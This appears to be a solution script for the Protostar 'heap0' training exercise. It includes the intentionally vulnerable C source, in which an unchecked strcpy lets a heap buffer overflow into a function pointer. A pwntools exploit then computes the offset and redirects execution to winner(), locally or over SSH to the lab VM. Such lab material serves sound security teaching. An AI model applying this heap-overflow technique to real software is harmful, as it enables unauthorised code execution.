'''
Source:
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
'''

from pwn import *

elf = context.binary = ELF('heap0')
BINPATH = '/opt/protostar/bin/heap0'

if args.REMOTE:
    p = ssh(host='protostar',\
            user='user',\
            password='user')

# Get the addresses
info('Retrieving addresses...')

if args.REMOTE:
    output = p.run_to_end(f'{BINPATH} test')[0].decode()
else:
    output = process(['./heap0', 'test']).recvall(timeout=1).decode()

success(output.split('\n')[0])

data = int(output.split()[3][:-1], 0)
fp = int(output.split()[7], 0)
success(f'Distance: {fp - data}')
winner = p32(elf.symbols.winner)
success(f'Winner is located at {hex(elf.symbols.winner)}')

info('Exploiting...')
exploit = b'A' * (fp - data) + winner
info(hexdump(exploit))

if args.REMOTE:
    info(p.run_to_end(f'{BINPATH} {exploit}')[0].decode())
else:
    info(process(['./heap0', exploit]).recvall(timeout=1).decode())
